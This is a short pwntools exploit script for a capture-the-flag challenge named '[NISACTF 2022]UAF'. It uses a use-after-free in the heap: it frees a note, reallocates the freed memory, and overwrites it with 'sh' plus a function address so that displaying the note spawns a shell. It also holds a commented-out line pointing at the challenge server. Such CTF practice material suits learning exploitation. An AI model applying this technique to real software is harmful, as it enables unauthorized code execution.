from pwn import *
context(log_level='debug',os='linux',arch='x86',terminal=['tmux','splitw','-h'])

io=process("./[NISACTF 2022]UAF")
# io=remote("1.14.71.254",28767)
NICO_addr=0x8048642

def create():
    io.recvuntil(b":")
    io.sendline(b"1")

def edit(num):
    io.recvuntil(b":")
    io.sendline(b"2")
    io.recvuntil(b"page\n")
    io.sendline(str(num))
    io.recvuntil(b"strings\n")

def dele(num):
    io.recvuntil(b":")
    io.sendline(b"3")
    io.recvuntil(b"page\n")
    io.sendline(str(num))

def show(num):
    io.recvuntil(b":")
    io.sendline(b"4")
    io.recvuntil(b"page\n")
    io.sendline(str(num))

create()
dele(0)
create()
edit(1)

gdb.attach(io)
pause()

payload=b"sh\x00\x00"+p32(NICO_addr)
io.sendline(payload)
show(0)
io.interactive()
